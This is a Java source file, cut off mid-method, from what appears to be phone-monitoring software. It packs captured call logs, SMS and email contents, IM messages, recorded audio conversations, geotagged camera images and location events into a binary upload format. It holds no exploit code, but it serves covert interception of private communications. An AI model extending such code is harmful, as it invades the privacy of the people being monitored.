package com.vvt.phoenix.prot.parser;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;

import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.event.Attachment;
import com.vvt.phoenix.prot.event.AudioConversationEvent;
import com.vvt.phoenix.prot.event.AudioConversationThumbnailEvent;
import com.vvt.phoenix.prot.event.AudioFileEvent;
import com.vvt.phoenix.prot.event.AudioFileThumnailEvent;
import com.vvt.phoenix.prot.event.BatteryLifeDebugEvent;
import com.vvt.phoenix.prot.event.CallLogEvent;
import com.vvt.phoenix.prot.event.CameraImageEvent;
import com.vvt.phoenix.prot.event.CameraImageThumbnailEvent;
import com.vvt.phoenix.prot.event.DebugMessageEvent;
import com.vvt.phoenix.prot.event.DebugMode;
import com.vvt.phoenix.prot.event.EmailEvent;
import com.vvt.phoenix.prot.event.EmbededCallInfo;
import com.vvt.phoenix.prot.event.Event;
import com.vvt.phoenix.prot.event.EventType;
import com.vvt.phoenix.prot.event.GeoTag;
import com.vvt.phoenix.prot.event.GpsBatteryLifeDebugEvent;
import com.vvt.phoenix.prot.event.HttpBatteryLifeDebugEvent;
import com.vvt.phoenix.prot.event.IMEvent;
import com.vvt.phoenix.prot.event.LocationEvent;
import com.vvt.phoenix.prot.event.MMSEvent;
import com.vvt.phoenix.prot.event.PanicImage;
import com.vvt.phoenix.prot.event.PanicStatus;
import com.vvt.phoenix.prot.event.Participant;
import com.vvt.phoenix.prot.event.Recipient;
import com.vvt.phoenix.prot.event.SMSEvent;
import com.vvt.phoenix.prot.event.SettingEvent;
import com.vvt.phoenix.prot.event.SettingEvent.SettingData;
import com.vvt.phoenix.prot.event.SystemEvent;
import com.vvt.phoenix.prot.event.Thumbnail;
import com.vvt.phoenix.prot.event.VideoFileEvent;
import com.vvt.phoenix.prot.event.VideoFileThumbnailEvent;
import com.vvt.phoenix.prot.event.WallPaperThumbnailEvent;
import com.vvt.phoenix.prot.event.WallpaperEvent;
import com.vvt.phoenix.util.ByteUtil;

public class EventParser {
	
	private static final String TAG = "EventParser";
	private static final int BUFFER_SIZE = 1024;
	
	public static void parseEvent(Event event, OutputStream outputStream) throws Exception{
		if(event == null){
			throw new IllegalArgumentException("Event object is NULL");
		}
		if(outputStream == null){
			throw new IllegalArgumentException("OutputStream object is NULL");
		}
		
		switch(event.getEventType()){
			case EventType.CALL_LOG						: parseCallLog((CallLogEvent) event, outputStream);break;
			case EventType.SMS							: parseSms((SMSEvent) event, outputStream);break;
			case EventType.MAIL							: parseEMail((EmailEvent) event, outputStream);break;
			case EventType.MMS							: parseMms((MMSEvent) event, outputStream);break;
			case EventType.IM							: parseIm((IMEvent) event, outputStream);break;
			case EventType.WALLPAPER_THUMBNAIL			: parseWallpaperThumbnail((WallPaperThumbnailEvent) event, outputStream);break;
			case EventType.CAMERA_IMAGE_THUMBNAIL		: parseCameraImageThumnail((CameraImageThumbnailEvent) event, outputStream); break;
			case EventType.AUDIO_CONVERSATION_THUMBNAIL	: parseAudioConversationThumbnail((AudioConversationThumbnailEvent) event, outputStream);break;
			case EventType.AUDIO_FILE_THUMBNAIL			: parseAudioFileThumbnail((AudioFileThumnailEvent) event, outputStream); break;
			case EventType.VIDEO_FILE_THUMBNAIL			: parseVideoFileThumbnail((VideoFileThumbnailEvent) event, outputStream); break;
			case EventType.WALLPAPER					: parseWallpaper((WallpaperEvent) event, outputStream); break;
			case EventType.CAMERA_IMAGE					: parseCameraImage((CameraImageEvent) event, outputStream); break;
			case EventType.AUDIO_CONVERSATION			: parseAudioConversation((AudioConversationEvent) event, outputStream); break;
			case EventType.AUDIO_FILE					: parseAudioFile((AudioFileEvent) event, outputStream); break;
			case EventType.VIDEO_FILE					: parseVideoFile((VideoFileEvent) event, outputStream); break;
			case EventType.SYSTEM						: parseSystemEvent((SystemEvent) event, outputStream); break;	
			case EventType.DEBUG_EVENT					: parseDebug((DebugMessageEvent) event, outputStream); break;
			case EventType.PANIC_IMAGE					: parsePanicImage((PanicImage) event, outputStream);break;
			case EventType.PANIC_STATUS					: parsePanicStatus((PanicStatus) event, outputStream); break;
			case EventType.LOCATION						: parseLocation((LocationEvent) event, outputStream); break;
			case EventType.SETTING						: parseSetting((SettingEvent) event, outputStream);break;
			default:
				FxLog.w(TAG, "> parseEvent # UNKNOWN Event");
				break;
		}
	}
	
	// ************************************************ Common Structures *************************************** //	
	private static void parseEventHeader(Event event, OutputStream stream) throws Exception{
		FxLog.d(TAG, String.format("> parseEventHeader # Event Type: %d", event.getEventType()));
		
		//1 parse event type(short 2 bytes)
		stream.write(ByteUtil.toBytes((short) event.getEventType()), 0, 2);
		
		//2 parse event time (19 bytes UTF)
		String eventTime = event.getEventTime();
		if(eventTime != null){
			byte[] eventTimeBytes = ByteUtil.toBytes(eventTime);
			stream.write(eventTimeBytes, 0, eventTimeBytes.length);
		}else{
			throw new IllegalArgumentException("Event time is empty");
		}
	}
	
	private static void parseRecipientStructure(Recipient rec, OutputStream stream) throws IOException{
		//1 parse Recipient Type
		stream.write((byte) rec.getRecipientType());
		
		//2 parse Recipient and its length(1 byte)
		String recipient = rec.getRecipient();
		if(recipient != null){
			byte[] bytesStr = ByteUtil.toBytes(recipient);
			int bytesLen = bytesStr.length; 
			stream.write((byte) bytesLen);
			stream.write(bytesStr, 0, bytesLen);
		}else{
			stream.write((byte) 0);
		}
		
		//3 parse Recipient Contact Name and its length(1 byte)
		String recipientContactName = rec.getContactName();
		if(recipientContactName != null){
			byte[] bytesStr = ByteUtil.toBytes(recipientContactName);
			int bytesLen = bytesStr.length; 
			stream.write((byte) bytesLen);
			stream.write(bytesStr, 0, bytesLen);
		}else{
			stream.write((byte) 0);
		}
	}

	private static void parseAttachmentStructure(Attachment att, OutputStream stream) throws IOException{
		
		//1 parse Attachment full name and 2 bytes length
		String fullName = att.getAttachmentFullName();
		if(fullName != null){
			byte[] bytesStr = ByteUtil.toBytes(fullName);
			stream.write(ByteUtil.toBytes((short) bytesStr.length), 0, 2);
			stream.write(bytesStr, 0, bytesStr.length);
		}else{
			stream.write(new byte[]{0x00, 0x00}, 0, 2);
		}
		
		//2 parse Attachment Data and 4 bytes length
		byte[] attach = att.getAttachmentData();
		if(attach != null){
			stream.write(ByteUtil.toBytes(attach.length), 0, 4);
			stream.write(attach, 0, attach.length);
		}else{
			stream.write(new byte[]{0x00, 0x00, 0x00, 0x00}, 0, 4);
		}
		
	}
	
	private static void parseParticipantStructure(Participant participant, OutputStream stream) throws IOException{
		
		//1 parse name and 1 byte length
		String name = participant.getName();
		if(name != null){
			byte[] bytesStr = ByteUtil.toBytes(name);
			int bytesLen = bytesStr.length; 
			stream.write((byte) bytesLen);
			stream.write(bytesStr, 0, bytesLen);
		}else{
			stream.write((byte) 0);
		}
		
		//2 parse UID and 1 byte length
		String uid = participant.getUid();
		if(uid != null){
			byte[] bytesStr = ByteUtil.toBytes(uid);
			int bytesLen = bytesStr.length; 
			stream.write((byte) bytesLen);
			stream.write(bytesStr, 0, bytesLen);
		}else{
			stream.write((byte) 0);
		}
		
	}
		
	private static void parseGeoTag(GeoTag geo, OutputStream stream) throws IOException{
		//1 verify GeoTag input
		double lon;
		double lat;
		float altitude;
		if(geo == null){
			FxLog.w(TAG, "> parseGeoTag # GeoTag is NULL, use default value");
			lon = 0.0;
			lat = 0.0;
			altitude = 0.0f;
		}else{
			lon = geo.getLon();
			lat = geo.getLat();
			altitude = (float) geo.getAltitude();
		}
		
		//2 parse Longitude (8 bytes)
		stream.write(ByteUtil.toBytes(lon), 0, 8);
		
		//3 parse Latitude (8 bytes)
		stream.write(ByteUtil.toBytes(lat), 0, 8);
		
		//4 parse Altitude (4 bytes)
		stream.write(ByteUtil.toBytes(altitude), 0, 4);
	}
		
	private static void parseEmbeddedCallInfo(EmbededCallInfo info, OutputStream stream) throws IOException{
		//1 parse direction (1 byte)
		stream.write((byte) info.getDirection());
		
		//2 parse duration (4 bytes)
		stream.write(ByteUtil.toBytes((int) info.getDuration()), 0, 4);
		
		//3 parse number and 1 byte length
		String number = info.getNumber();
		if(number != null){
			byte[] bytesStr = ByteUtil.toBytes(number);
			int bytesLen = bytesStr.length; 
			stream.write((byte) bytesLen);
			stream.write(bytesStr, 0, bytesLen);
		}else{
			stream.write((byte) 0);
		}
		
		//4 parse contact name and 1 byte length
		String contactName = info.getContactName();
		if(contactName != null){
			byte[] bytesStr = ByteUtil.toBytes(contactName);
			int bytesLen = bytesStr.length; 
			stream.write((byte) bytesLen);
			stream.write(bytesStr, 0, bytesLen);
		}else{
			stream.write((byte) 0);
		}
	}
	
	private static void parseFileDataWith4BytesLength(String absolutePath, OutputStream fileOutStream) throws IOException{
		if(absolutePath != null){
			File f = new File(absolutePath);
			int length = (int) f.length();
			if(length != 0){
				fileOutStream.write(ByteUtil.toBytes(length), 0, 4);
				
				FileInputStream fIn = new FileInputStream(f);
				byte[] buffer = new byte[BUFFER_SIZE];
				int readCount = fIn.read(buffer);
				while(readCount != -1){
					fileOutStream.write(buffer, 0, readCount);
					readCount = fIn.read(buffer);
				}
				fIn.close();
			}else{
				FxLog.w(TAG, "> parseFileDataWith4BytesLength # File length = 0");
				fileOutStream.write(new byte[]{0x00, 0x00, 0x00, 0x00}, 0, 4);
			}
		}else{
			FxLog.w(TAG, "> parseFileDataWith4BytesLength # Image path is NULL");
			fileOutStream.write(new byte[]{0x00, 0x00, 0x00, 0x00}, 0, 4);
		}
	}
	
	// ************************************************ Communication Events *************************************** //
	
	private static void parseCallLog(CallLogEvent event, OutputStream fileOutStream) throws Exception{
		
		FxLog.d(TAG, "> parseCallLog");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse Direction (1 byte)
		fileOutStream.write((byte) event.getDirection());
		
		//3 parse duration (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getDuration()), 0, 4);
		
		//4 parse Number and its length(1 byte)
		String number = event.getNubmer();
		if(number != null){
			byte[] bytesStr = ByteUtil.toBytes(number);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//5 parse Contact Name and its length(1 byte)
		String contactName = event.getContactName();
		if(contactName != null){
			byte[] bytesStr = ByteUtil.toBytes(contactName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}

		FxLog.i(TAG, "> parseCallLog # OK");
	}
	
	private static void parseSms(SMSEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseSms");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);

		//2 parse Direction (1 byte)
		fileOutStream.write((byte) event.getDirection());
		
		//3 parse Sender Number and its length (1 byte)
		String senderNumber = event.getSenderNumber();
		if(senderNumber != null){
			byte[] bytesStr = ByteUtil.toBytes(senderNumber);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//4 parse Contact Name and its length (1 byte)
		String contactName = event.getContactName();
		if(contactName != null){
			byte[] bytesStr = ByteUtil.toBytes(contactName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//5 parse Recipient Structure
		  // parse Recipients count (short 2 bytes)
		int recipientCount = event.getRecipientAmount();
		fileOutStream.write(ByteUtil.toBytes((short) recipientCount), 0, 2);
		  // parse each Recipient
		for(int i=0; i<recipientCount; i++){
			parseRecipientStructure(event.getRecipient(i), fileOutStream);			
		}
		
		//6 parse SMS Data and its length (2 bytes)
		String smsData = event.getSMSData();
		if(smsData != null){
			byte[] bytesStr = ByteUtil.toBytes(smsData);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen));
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00}, 0, 2);
		}
		
		FxLog.i(TAG, "> parseSms # OK");
	}
	
	private static void parseEMail(EmailEvent event, OutputStream fileOutStream) throws Exception{
		
		FxLog.d(TAG, "> parseEMail");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse direction
		fileOutStream.write((byte) event.getDirection());
		
		//3 parse sender email
		String senderMail = event.getSenderEMail();
		if(senderMail != null){
			byte[] bytesStr = ByteUtil.toBytes(senderMail);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//4 parse sender contact name
		String senderContactName = event.getSenderContactName();
		if(senderContactName != null){
			byte[] bytesStr = ByteUtil.toBytes(senderContactName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//5 parse Recipient structure
		//5.1 parse Recipients count (short 2 bytes)
		int recipientCount = event.getRecipientAmount();
		fileOutStream.write(ByteUtil.toBytes((short) recipientCount), 0, 2);
		//5.2 parse each Recipient
		for(int i=0; i<recipientCount; i++){
			parseRecipientStructure(event.getRecipient(i), fileOutStream);			
		}
		
		//6 parse subject and 2 bytes length
		String subject = event.getSubject();
		if(subject != null){
			byte[] bytesStr = ByteUtil.toBytes(subject);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen), 0, 2);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00});
		}
		
		//7 parse Attachment Struct
		//7.1 parse Attachments count (byte 1 byte)
		int attachCount = event.getAttachmentAmount();
		fileOutStream.write((byte) attachCount);
		//7.2 parse each Attachment
		for(int i=0; i<attachCount; i++){
			parseAttachmentStructure(event.getAttachment(i), fileOutStream);
		}
		
		//8 parse EMail body and 4 bytes length
		String mailBody = event.getEMailBody();
		if(mailBody != null){
			byte[] bytesStr = ByteUtil.toBytes(mailBody);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes(bytesLen), 0, 4);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00, 0x00, 0x00});
		}
		
		FxLog.i(TAG, "> parseEMail # OK");
	}
	
	private static void parseMms(MMSEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseMms");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse direction
		fileOutStream.write((byte) event.getDirection());

		//3 parse sender number and 1 byte length
		String senderNumber = event.getSenderNumber();
		if(senderNumber != null){
			byte[] bytesStr = ByteUtil.toBytes(senderNumber);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//4 parse contact name and 1 byte length
		String contactName = event.getContactName();
		if(contactName != null){
			byte[] bytesStr = ByteUtil.toBytes(contactName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//5 parse Recipient structure
		//5.1 parse Recipients count (short 2 bytes)
		int recipientCount = event.getRecipientAmount();
		fileOutStream.write(ByteUtil.toBytes((short) recipientCount), 0, 2);
		//5.2 parse each Recipient
		for(int i=0; i<recipientCount; i++){
			parseRecipientStructure(event.getRecipient(i), fileOutStream);			
		}
		
		//6 parse subject and 2 bytes length
		String subject = event.getSubject();
		if(subject != null){
			byte[] bytesStr = ByteUtil.toBytes(subject);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen), 0, 2);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00});
		}
		
		//7 parse Attachment Struct
		//7.1 parse Attachments count (byte 1 byte)
		int attachCount = event.getAttachmentAmount();
		fileOutStream.write((byte) attachCount);
		//7.2 parse each Attachment
		for(int i=0; i<attachCount; i++){
			parseAttachmentStructure(event.getAttachment(i), fileOutStream);
		}
		
		FxLog.i(TAG, "> parseMms # OK");
	}
	
	private static void parseIm(IMEvent event, OutputStream fileOutStream) throws Exception{
		
		FxLog.d(TAG, "> parseIm");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
				
		//2 parse event direction
		fileOutStream.write((byte) event.getDirection());
		
		//3 parse user ID with 1 byte length
		String userId = event.getUserId();
		if(userId != null){
			byte[] bytesStr = ByteUtil.toBytes(userId);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//4 parse participant structure and 2 bytes count
		int participantCount = event.getParticipantAmount();
		fileOutStream.write(ByteUtil.toBytes((short) participantCount), 0, 2);
		for(int i=0; i<participantCount; i++){
			parseParticipantStructure(event.getParticipant(i), fileOutStream);
		}
		
		//5 parse IM service ID with 1 byte length
		String serviceId = event.getImServiceId();
		if(serviceId != null){
			byte[] bytesStr = ByteUtil.toBytes(serviceId);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//6 parse message with 2 bytes length
		String message = event.getMessage();
		if(message != null){
			byte[] bytesStr = ByteUtil.toBytes(message);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen), 0, 2);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00});
		}
		
		//7 parse user display message with 1 byte length
		String displayName = event.getUserDisplayName();
		if(displayName != null){
			byte[] bytesStr = ByteUtil.toBytes(displayName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		FxLog.i(TAG, "> parseIm # OK");
	}
	
	
	// ************************************************ Media thumbnail Events *************************************** //
	
	private static void parseWallpaperThumbnail(WallPaperThumbnailEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseWallpaperThumbnail");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse paring ID 4 bytes
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse format 1 byte
		fileOutStream.write((byte) event.getFormat());
		
		//4 image data and 4 bytes length
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
		
		//5 parse actual file size 4 bytes
		fileOutStream.write(ByteUtil.toBytes((int) event.getActualFileSize()), 0, 4);
		
		FxLog.i(TAG, "> parseWallpaperThumbnail # OK");
	}

	private static void parseCameraImageThumnail(CameraImageThumbnailEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseCameraImageThumnail");
		
		//1 parse event header
		parseEventHeader(event, fileOutStream);
		
		//2 parse Paring ID (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse Format (1 byte)
		fileOutStream.write((byte) event.getMediaFormat());
		
		//4 parse GeoTag
		parseGeoTag(event.getGeo(), fileOutStream);
		
		//5 parse image data and 4 bytes length
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
				
		//6 parse actual file size (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getActualSize()), 0, 4);
		
		FxLog.i(TAG, "> parseCameraImageThumnail # OK");
	}
	
	private static void parseAudioConversationThumbnail(AudioConversationThumbnailEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseAudioConversationThumbnail");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse paring ID (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse format (1 byte)
		fileOutStream.write((byte) event.getFormat());
		
		//4 parse embedded call info
		parseEmbeddedCallInfo(event.getEmbededCallInfo(), fileOutStream);
		
		//5 parse audio and 4 bytes length
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
		
		//6 parse actual file size (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getActualFileSize()), 0, 4);
		
		//7 parse actual duration (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getActualDuration()), 0, 4);
		
		FxLog.i(TAG, "> parseAudioConversationThumbnail # OK");
	}
	
	private static void parseAudioFileThumbnail(AudioFileThumnailEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseAudioFileThumbnail");
		
		//1 parse event header
		parseEventHeader(event, fileOutStream);
		
		//2 parse Paring ID (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse Format (1 byte)
		fileOutStream.write((byte) event.getMediaFormat());
		
		//4 parse audio data and 4 bytes length
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
				
		//5 parse actual file size (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getActualFileSize()), 0, 4);
		
		//6 parse actual duration (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getActualDuration()), 0, 4);

		FxLog.i(TAG, "> parseAudioFileThumbnail # OK");
	}
	
	private static void parseVideoFileThumbnail(VideoFileThumbnailEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseVideoFileThumbnail");
		
		//1 parse event header
		parseEventHeader(event, fileOutStream);
		
		//2 parse Paring ID (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);		
		
		//3 parse Format (1 byte)
		fileOutStream.write((byte) event.getMediaFormat());
		
		//4 parse video and 4 bytes length
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
		
		//5 parse image thumbnails and count (1 byte)
		int imgCount = event.getImagesCount();
		fileOutStream.write((byte) imgCount);
		if(imgCount != 0){
			Thumbnail thumb;
			for(int i=0; i<imgCount; i++){
				thumb = event.getThumbnail(i);
				//image data and length 4 bytes
				parseFileDataWith4BytesLength(thumb.getFilePath(), fileOutStream);
			}
		}else{
			FxLog.w(TAG, "> parseVideoFileThumbnail # No thumbnail");
		}
		
		//6 parse actual file size (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getActualFileSize()), 0, 4);
		
		//7 parse actual duration (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getActualDuration()), 0, 4);
		
		FxLog.i(TAG, "> parseVideoFileThumbnail # OK");
	}
	
	// ************************************************ Actual media Events *************************************** //
	
	private static void parseWallpaper(WallpaperEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseWallpaper");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
				
		//2 parse paring ID 4 bytes
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse format 1 byte
		fileOutStream.write((byte) event.getFormat());
		
		//4 parse image and 4 bytes length
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
				
		FxLog.i(TAG, "> parseWallpaper # OK");
	}
	
	private static void parseCameraImage(CameraImageEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseCameraImage");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse paring ID 4 bytes
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse format 1 byte
		fileOutStream.write((byte) event.getMediaFormat());
		
		//4 parse GEO tag
		parseGeoTag(event.getGeo(), fileOutStream);
		
		//5 parse file name and length 1 byte
		String fileName = event.getFileName();
		if(fileName != null){
			byte[] bytesStr = ByteUtil.toBytes(fileName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//6 parse image data and length 4 bytes
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
				
		FxLog.i(TAG, "> parseCameraImage # OK");
	}
	
	private static void parseAudioConversation(AudioConversationEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseAudioConversation");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse paring ID 4 bytes
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse format 1 byte
		fileOutStream.write((byte) event.getFormat());
		
		//4 parse embedded call info
		parseEmbeddedCallInfo(event.getEmbededCallInfo(), fileOutStream);
		
		//5 parse file name and 1 byte length
		String fileName = event.getFileName();
		if(fileName != null){
			byte[] bytesStr = ByteUtil.toBytes(fileName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//6 parse audio data and 4 bytes length
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
		
		FxLog.i(TAG, "> parseAudioConversation # OK");
	}
	
	private static void parseAudioFile(AudioFileEvent event, OutputStream fileOutStream) throws Exception{
		
		FxLog.d(TAG, "> parseAudioFile");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse paring ID 4 bytes
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse format 1 byte
		fileOutStream.write((byte) event.getMediaFormat());
		
		//4 parse file name and length 1 byte
		String fileName = event.getFileName();
		if(fileName != null){
			byte[] bytesStr = ByteUtil.toBytes(fileName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//5 parse audio data and length 4 bytes
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
		
		FxLog.i(TAG, "> parseAudioFile # OK");
	}
	
	private static void parseVideoFile(VideoFileEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseVideoFile");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse paring ID 4 bytes
		fileOutStream.write(ByteUtil.toBytes((int) event.getParingId()), 0, 4);
		
		//3 parse format 1 byte
		fileOutStream.write((byte) event.getMediaFormat());
		
		//4 parse file name and length 1 byte
		String fileName = event.getFileName();
		if(fileName != null){
			byte[] bytesStr = ByteUtil.toBytes(fileName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//5 parse video data and length 4 bytes
		parseFileDataWith4BytesLength(event.getFilePath(), fileOutStream);
		
		FxLog.i(TAG, "> parseVideoFile # OK");		
	}
	
	// ************************************************ System Events *************************************** //
	
	private static void parseSystemEvent(SystemEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseSystemEvent");
		
		//1 parse event header
		parseEventHeader(event, fileOutStream);
		
		//2 parse Category : 1 byte
		fileOutStream.write((byte) event.getCategory());
		
		//3 parse Event Direction : 1 byte
		fileOutStream.write((byte) event.getDirection());
		
		//4 parse Data with 4 bytes length
		String data = event.getSystemMessage();
		if(data != null){
			byte[] bytesStr = ByteUtil.toBytes(data);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes(bytesLen), 0, 4);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00, 0x00, 0x00});
		}
				
		FxLog.i(TAG, "> parseSystemEvent # OK");
	}
	
	private static void parseDebug(DebugMessageEvent event, OutputStream fileOutStream) throws Exception{
		
		FxLog.d(TAG, "> parseDebug");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse Debug Mode
		int mode = event.getMode();
		fileOutStream.write(ByteUtil.toBytes((short) mode), 0, 2);
		
		//3 parse text fields and field count
		  // parse Field Count
		int fieldCount = event.getFieldCount();
		fileOutStream.write((byte) fieldCount);
		switch(mode){
			case DebugMode.HTTP_BATTERY_LIFE : parseHttpBatteryLifeDebug((HttpBatteryLifeDebugEvent) event, fileOutStream); break;
			case DebugMode.GPS_BATTERY_LIFE	 : parseGpsBatteryLifeDebug((GpsBatteryLifeDebugEvent) event, fileOutStream); break;
		}
		

		
		FxLog.i(TAG, "> parseDebug # OK");		
	}
	
	private static void parseBatteryLifeDebugEveng(BatteryLifeDebugEvent event, OutputStream fileOutStream) throws IOException{
		//1 parse battery before and 2 bytes length
		String battBefore = event.getBatteryBefore();
		if(battBefore != null){
			byte[] bytesStr = ByteUtil.toBytes(battBefore);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen));
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00});
		}
		
		//2 parse battery after and 2 bytes length
		String battAfter = event.getBatteryAfter();
		if(battAfter != null){
			byte[] bytesStr = ByteUtil.toBytes(battAfter);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen));
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00});
		}
		
		//3 parse start time and 2 bytes length
		String startTime = event.getStartTime();
		if(startTime != null){
